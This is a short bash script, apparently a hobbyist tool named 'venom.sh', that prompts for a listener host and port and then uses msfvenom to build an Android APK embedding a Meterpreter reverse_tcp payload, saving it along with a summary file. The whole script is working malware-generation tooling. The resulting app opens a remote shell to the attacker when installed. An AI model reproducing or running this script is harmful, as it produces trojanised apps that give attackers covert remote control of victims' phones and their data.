#!/bin/bash
#script:venom.sh by stephan
home=/home
payload_dir=$home/payload/apk
app="<app_name.apk>"
echo "$(tput setaf 1)"
#figlet "venom..apk"
toilet -f standard --filter border:metal "Venom APK"
echo "by S@nj33v St3ph@n Murmu $(tput setaf 7)"
echo "msfvenom -p $(tput setaf 2)android/meterpreter/reverse_tcp $(tput setaf 1)lhost=..... lport=.....$(tput setaf 2)R > $payload_dir/$(tput setaf 1)$app"
echo "$(tput setaf 7)"
echo "Ent3r List3ning H0st:"
read lhost
echo "Ent3r List3ning P0rt:"
read lport
echo "Ent3r App Name('.apk' will be added automatically)"
read app_name
apk="$app_name.apk"
#################################### Writing to file ###############################################
txtfile=$payload_dir/$app_name.txt
touch $txtfile
figlet "$app_name.apk" >> $txtfile
echo "-------------------------------------------------------------------------------------------" >> $txtfile
echo "LHOST      :      $lhost"                          >> $txtfile
echo "LPORT      :      $lport"                          >> $txtfile
echo "APP        :      $apk"                            >> $txtfile
echo "EXPLOIT    :      msfvenom"                        >> $txtfile
echo "PAYLOAD(-p):      android/meterpreter/reverse_tcp" >> $txtfile
echo "SavedTo    :      $payload_dir"                    >> $txtfile
echo "msfvenom -p android/meterpreter/reverse_tcp lhost=$lhost lport=$lport R > $payload_dir/$apk"  >> $txtfile
echo "-------------------------------------------------------------------------------------------"  >> $txtfile
###################################### Reading file ################################################
echo "Reading....$txtfile"
cat $txtfile
###################################### Making Exploitable APK ###########################################
echo ...Creating $app_name.apk
msfvenom -p android/meterpreter/reverse_tcp lhost=$lhost lport=$lport R > $payload_dir/$app_name.apk
echo "$app_name.apk $(tput setaf 2)successfully Created at directory $(tput setaf 7)($payload_dir)"
############################################################################################################

